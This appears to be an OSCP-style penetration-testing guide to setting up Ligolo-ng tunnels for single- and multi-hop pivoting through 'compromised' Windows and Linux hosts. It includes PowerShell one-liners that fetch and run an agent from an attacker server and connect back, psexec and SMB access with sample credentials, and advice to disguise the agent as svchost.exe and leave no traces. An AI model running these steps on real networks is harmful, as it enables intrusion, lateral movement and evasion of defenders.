# Ligolo-ng Complete Setup Guide

## Table of Contents

- [Installation](#installation)
- [Basic Tunnel Setup](#basic-tunnel-setup)
- [Single-Hop Pivoting](#single-hop-pivoting)
- [Multi-Hop Pivoting](#multi-hop-pivoting)
- [Advanced Routing](#advanced-routing)
- [Troubleshooting](#troubleshooting)

---

## Installation

### Quick Check (One-liner)

```shell
# Quick Ligolo-ng pivot setup (all commands need sudo)
sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up && ./proxy --selfcert
```

> ⚠️ **Common Errors:**
>
> | Error | Cause | Fix |
> | --- | --- | --- |
> | `ioctl(TUNSETIFF): Operation not permitted` | Missing sudo | Run with `sudo` |
> | `RTNETLINK answers: Operation not permitted` | Missing sudo on `ip link` | Use `sudo ip link set ligolo up` |
> | `ioctl(TUNSETIFF): Device or resource busy` | Interface already exists | Delete first: `sudo ip link delete ligolo` |
>
> **Reset interface if busy:**
>
> ```shell
> sudo ip link delete ligolo 2>/dev/null; sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
> ```

### Attacker Machine (Kali)

> Download Ligolo-ng proxy (v0.8.2)

```shell
# Download latest version
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
tar -xzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
chmod +x proxy
./proxy --version
```

> **Fix Permission Error (setcap):**

```shell
# Option 1: Run with sudo every time
sudo ./proxy --selfcert

# Option 2: Set capabilities permanently (recommended)
sudo setcap cap_net_admin,cap_net_raw+eip ./proxy
./proxy --selfcert  # Now works without sudo
```

### Target Machine (Windows/Linux)

> Download agent for Windows

```powershell
# From PowerShell on target (v0.8.2)
iwr -Uri "https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip" `
  -Outfile agent.zip
Expand-Archive agent.zip -DestinationPath .
```

> Download agent for Linux

```shell
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
tar -xzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
chmod +x agent
```

> Test agent connectivity

```shell
./agent -h
# Should show help menu
```

---

## Basic Tunnel Setup

### Step 1: Start Proxy on Attacker

> Generate self-signed certificate (first run only)

```shell
# Default port is now 11601
./proxy --selfcert

# Or specify port
./proxy --selfcert --laddr 0.0.0.0:443
```

**Output:**

```text
INFO[0000] Listening on 0.0.0.0:11601
```

**Flags Explained (v0.8.x):**

- `--selfcert`: Auto-generate self-signed certificate
- `--laddr 0.0.0.0:443`: Listen on all interfaces, port 443
- `--autocert`: Automatically request LetsEncrypt certificates
- `--webui`: Enable web interface (multiplayer mode)
- `-config ligolo-ng.yaml`: Use configuration file

### Step 2: Deploy Agent on Target

> Connect agent to proxy (Windows)

```powershell
# Default port is now 11601
.\agent.exe -connect 192.168.49.87:11601 -ignore-cert
```

> Connect agent to proxy (Linux)

```shell
./agent -connect 192.168.49.87:11601 -ignore-cert
```

**Flags Explained:**

- `-connect ATTACKER:443`: Proxy address and port
- `-ignore-cert`: Ignore self-signed cert errors
- `-relay-timeout 60`: Connection timeout
- `-retry 10`: Retry 10 times before quitting

### Step 3: Create Tunnel Session

> In Ligolo proxy CLI, list agents

```text
ligolo-ng » session
[*] No session
```

> Wait for agent to connect, then

```text
ligolo-ng » session
[*] 1 - NT AUTHORITY\SYSTEM@HOSTNAME - 192.168.49.87:11601 [Agent 0.8.2]
```

> Start session

```text
ligolo-ng » session -i 1
[Agent: NT AUTHORITY\SYSTEM@HOSTNAME] »
```

**Status: ACTIVE TUNNEL** ✅

### Step 4: Autoroute (v0.8+ Feature) 🆕

> **NEW in v0.8:** Automatic route and interface creation!

```text
[Agent: NT AUTHORITY\SYSTEM@HOSTNAME] » autoroute
? Select routes to add: 172.16.87.0/24
? Create a new interface or use an existing one? Create a new interface
INFO[0176] Generating a random interface name...
INFO[0176] Using interface name valuedlady
INFO[0176] Creating routes for valuedlady...
? Start the tunnel? Yes
INFO[0180] Starting tunnel to NT AUTHORITY\SYSTEM@HOSTNAME
```

> **Manual route (if autoroute fails):**

> Get agent's network info

```text
[Agent: user@HOSTNAME]» ifconfig
eth0: flags=... inet 172.16.87.100/24
```

> Add route to reach internal network

```shell
# Create tun interface (use your username, not 'kali')
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.87.0/24 dev ligolo
```

> ⚠️ **If interface already exists:**

```shell
# Delete and recreate
sudo ip link delete ligolo
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.87.0/24 dev ligolo
```

### Step 5: Verify Tunnel

> Test connectivity from attacker

```shell
ping 172.16.87.100  # Should respond
ping 172.16.87.200  # Other internal host
```

> If working, you can now use internal tools

```shell
nmap -sV 172.16.87.200
nxc smb 172.16.87.200 -u username -p password
```

---

## Single-Hop Pivoting

### Scenario: Compromised Machine → Internal Network

**Setup:**

- Compromised: 192.168.49.100 (WS26)
- Internal target: 172.16.87.200 (SRV22)
- Attacker: 192.168.49.87

### Complete Workflow

> Step 1: From WS26, download and execute agent

```powershell
# On WS26 (compromised machine)
$Url = "http://192.168.49.87:7000/agent.exe"
$Output = "C:\Temp\agent.exe"
(New-Object Net.WebClient).DownloadFile($Url, $Output)
& $Output -connect 192.168.49.87:443 -ignore-cert
```

> Step 2: In Ligolo proxy, verify session

```text
ligolo-ng » session
[*] 1 - ws26\user - 172.16.87.100:443 [Agent 0.7.12]
```

> Step 3: Interact with session

```text
[Agent: ws26\user]» ifconfig
eth0: inet 172.16.87.100/24
```

> Step 4: Add internal route

```shell
# Use $(whoami) to get current username dynamically
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.87.0/24 dev ligolo
```

> Step 5: Scan internal network through tunnel

```shell
nmap -Pn -p 445,3306,1433,5985 172.16.87.200 -sV
nxc smb 172.16.87.200 -u svc_sql -p SQLPowerHouse333
```

> Step 6: Use tunneled tools

```shell
# RDP through tunnel
xfreerdp3 /u:Administrator /p:Password123 /v:172.16.87.200

# PSExec through tunnel
impacket-psexec svc_sql:SQLPowerHouse333@172.16.87.200
```

---

## Multi-Hop Pivoting

### Scenario: Attacker → WS26 → Internal Network → DC20

**Network Layout:**

```text
[Attacker] → [WS26] → [Internal 172.16.87.0/24] → [DC20]
192.168.49.87  192.168.49.100  Compromised     172.16.87.200
```

### Multi-Hop Setup

> Step 1: Compromise WS26 and setup first tunnel

```powershell
# On WS26
.\agent.exe -connect 192.168.49.87:443 -ignore-cert
```

> Step 2: In Ligolo, create listener for second pivot

```text
[Agent: ws26\user]» listener_add --addr 0.0.0.0:9999 --to 127.0.0.1:443
[*] Listener on 0.0.0.0:9999 → 127.0.0.1:443
```

**Why:** This creates a pivot point for the next agent

> Step 3: From internal machine (SRV22), connect to WS26

```powershell
# On SRV22 (internal, compromised via tunnel)
# Download agent first
$Url = "http://172.16.87.100:7000/agent.exe"
$Output = "C:\agent.exe"
(New-Object Net.WebClient).DownloadFile($Url, $Output)

# Connect to WS26's listener
& $Output -connect 172.16.87.100:9999 -ignore-cert
```

> Step 4: In Ligolo, verify second session

```text
ligolo-ng » session
[*] 1 - ws26\user - 172.16.87.100:443
[*] 2 - srv22\svc_sql - 172.16.87.100:9999
```

> Step 5: Switch to second session and get network info

```text
ligolo-ng » session -i 2
[Agent: srv22\svc_sql]» ifconfig
eth0: inet 172.16.87.201/24
```

> Step 6: Add route for second network

```shell
# If SRV22 can reach DC network (e.g., 172.16.100.0/24)
# In Ligolo CLI:
# Use route_add to reach further networks
```

### Managing Multiple Sessions

> List all active sessions

```text
ligolo-ng » session
```

> Switch between sessions

```text
ligolo-ng » session -i 1  # WS26
# Do something
ligolo-ng » session -i 2  # SRV22
# Do something else
```

> Keep multiple tunnels active simultaneously

```shell
# Terminal 1: WS26 tunnel
sudo ip route add 172.16.87.0/24 dev ligolo-ws26

# Terminal 2: SRV22 tunnel  
sudo ip route add 172.16.100.0/24 dev ligolo-srv22
```

---

## Advanced Routing

### Accessing Internal Networks Behind Pivot

> Get all network interfaces from agent

```text
[Agent: ws26\user]» ifconfig
eth0: inet 192.168.87.100/24 broadcast 192.168.87.255 netmask 255.255.255.0
eth1: inet 172.16.87.100/24 broadcast 172.16.87.255 netmask 255.255.255.0
eth2: inet 10.0.0.100/24 broadcast 10.0.0.255 netmask 255.255.255.0
```

> Add multiple routes for all connected networks

```shell
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.87.0/24 dev ligolo
sudo ip route add 10.0.0.0/24 dev ligolo
```

### Reverse Port Forwarding

> Forward internal service to attacker

```text
[Agent: ws26\user]» listener_add --addr 127.0.0.1:8080 --to 172.16.87.200:3306
[*] Listener on 127.0.0.1:8080 → 172.16.87.200:3306
```

> From attacker machine, connect to local forward

```shell
mysql -h 127.0.0.1 -P 8080 -u root -pPassword
```

### SOCKS Proxy (Alternative to Tunnel)

> Create SOCKS proxy listener

```text
[Agent: ws26\user]» listener_add --addr 127.0.0.1:1080 --socks5
[*] SOCKS5 server listening on 127.0.0.1:1080
```

> Use with proxychains

```shell
# /etc/proxychains4.conf
socks5 127.0.0.1 1080

proxychains nmap -Pn -p 445 172.16.87.200
proxychains impacket-psexec user@172.16.87.200
```

---

## Troubleshooting

### Issue 1: Agent Won't Connect

**Error:** `Connection refused` or timeout

> Solution: Verify proxy is listening

```shell
netstat -tlnp | grep :443
```

> Check firewall on attacker

```shell
sudo ufw allow 443
```

> Use verbose logging

```shell
./agent.exe -verbose -connect 192.168.49.87:443 -ignore-cert
```

### Issue 2: Route Not Working

**Error:** `Destination unreachable` or `No route to host`

> Verify route added

```shell
ip route | grep ligolo
```

> Add route with explicit metric

```shell
sudo ip route add 172.16.87.0/24 dev ligolo metric 100
```

> Check TUN interface is up

```shell
ip link show ligolo
# Should show: ligolo: <POINTOPOINT,UP,LOWER_UP>
```

### Issue 3: Certificate Issues

**Error:** `certificate verification failed`

> Always use `-ignore-cert` flag

```shell
./agent.exe -connect 192.168.49.87:443 -ignore-cert
```

> Or provide cert manually

```shell
./agent.exe -connect 192.168.49.87:443 -cacert /path/to/cert.pem
```

### Issue 4: Slow Performance

> Check tunnel latency

```text
[Agent: user@host]» info
Connected: 192.168.49.87:443
Latency: 50ms
```

> Reduce relay timeout if needed

```shell
./agent.exe -connect 192.168.49.87:443 -relay-timeout 30 -ignore-cert
```

### Issue 5: Agent Disconnects After 5 Minutes

> Increase retry attempts

```shell
./agent.exe -connect 192.168.49.87:443 -ignore-cert -retry 100
```

> Or keep proxy running with reconnect enabled

```shell
./proxy-linux-amd64 -selfcert -laddr 0.0.0.0:443 -allow-all
```

---

## Security Considerations

### Hiding Ligolo-ng Process

> On Windows, rename agent

```powershell
ren agent.exe svchost.exe
```

> On Linux, change process name

```bash
# Use: https://github.com/airman00/liprouting
# Or rename binary: mv agent-linux-amd64 /usr/local/bin/systemd-update
```

### Cleanup

> Remove tunnels after usage

```shell
sudo ip route del 172.16.87.0/24 dev ligolo
sudo ip link set ligolo down
sudo ip tuntap del user kali mode tun ligolo
```

> Kill agent on target (leave no traces)

```powershell
taskkill /IM agent.exe /F
```

---

## Quick Reference

### Standard Setup (30 seconds)

```bash
# Terminal 1: Proxy
./proxy-linux-amd64 -selfcert -laddr 0.0.0.0:443

# Terminal 2: Setup TUN
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

# Terminal 3: Execute on target
agent.exe -connect 192.168.49.87:443 -ignore-cert

# Proxy CLI: Start session
session -i 1

# Terminal 2: Add route
sudo ip route add 172.16.87.0/24 dev ligolo

# Test
ping 172.16.87.200
```

### Multi-Hop Pivot (2 minutes)

```text
# First hop: agent connects to proxy
# In proxy CLI:
listener_add --addr 0.0.0.0:9999 --to 127.0.0.1:443

# Second hop: next agent connects to first pivot
agent2.exe -connect 172.16.87.100:9999 -ignore-cert

# Verify and route
session -i 2
# Add new route for second network
```

### Verify Everything Works

```shell
# From attacker
ping 172.16.87.200        # Verify route
nmap -Pn 172.16.87.200    # Verify access
nxc smb 172.16.87.200 # Verify SMB
impacket-psexec user@172.16.87.200  # Verify execution
```

---

## Ligolo-ng v0.8.x New Features

### Autoroute (Automatic Setup)

> Automatically creates interfaces and routes

```text
[Agent: NT AUTHORITY\SYSTEM@HOST] » autoroute
? Select routes to add: 172.16.87.0/24
? Create a new interface or use an existing one? Create a new interface
INFO[0176] Generating a random interface name...
INFO[0176] Using interface name valuedlady
? Start the tunnel? Yes
INFO[0180] Starting tunnel
```

### Interface Management Commands

```text
# List interfaces
ligolo-ng » interface_list

# Create named interface
ligolo-ng » interface_create --name "evil-cha"

# Add route to interface
ligolo-ng » interface_add_route --name evil-cha --route 192.168.2.0/24

# Delete route
ligolo-ng » interface_del_route --name evil-cha --route 192.168.2.0/24

# Start tunnel on specific interface
[Agent: user@host] » tunnel_start --tun evil-cha
```

### WebUI (Multiplayer Mode)

```shell
# Enable WebUI for team collaboration
./proxy --selfcert --webui

# Access at: https://localhost:8080
```

### Configuration File

```yaml
# ligolo-ng.yaml
selfcert: true
laddr: "0.0.0.0:11601"
webui: true
```

### Agent Kill (Remote Terminate)

```text
# Terminate agent remotely
ligolo-ng » session -i 1
[Agent: user@host] » kill
```

### Permission Fix (setcap)

```shell
# Fix "Operation not permitted" error permanently
sudo setcap cap_net_admin,cap_net_raw+eip ./proxy

# Verify capabilities
getcap ./proxy
# Output: ./proxy cap_net_admin,cap_net_raw=eip
```

---

## See Also

### Related Lateral Movement Files

- **[Pivoting & Tunneling](5.2.Pivoting-Tunneling.md)** - SSH tunnels, Chisel, Proxychains, sshuttle
- **[Lateral Movement](5.1.Lateral-Movement.md)** - PsExec, WMI, WinRM, Pass-the-Hash

### AD Exploitation (After Pivoting)

- **[AD Exploitation](../3.AD-Exploit/3.1.AD-Exploitation.md)** - BloodHound on internal network
- **[Kerberos Attacks](../3.AD-Exploit/3.3.Kerberos-Attacks.md)** - Attack DC after tunnel setup
- **[NTLM Relay](../3.AD-Exploit/3.4.NTLM-Relay-and-Responder.md)** - Responder through tunnel

### OSCP Preparation

- **[Lab Walkthrough Examples](../9.OSCP-Exam/9.2.Lab-Walkthrough-Examples.md)** - AD Set uses Ligolo-ng pivoting
- **[Exam Tips](../9.OSCP-Exam/9.3.Exam-Tips-and-Tricks.md)** - AD Set scoring strategy
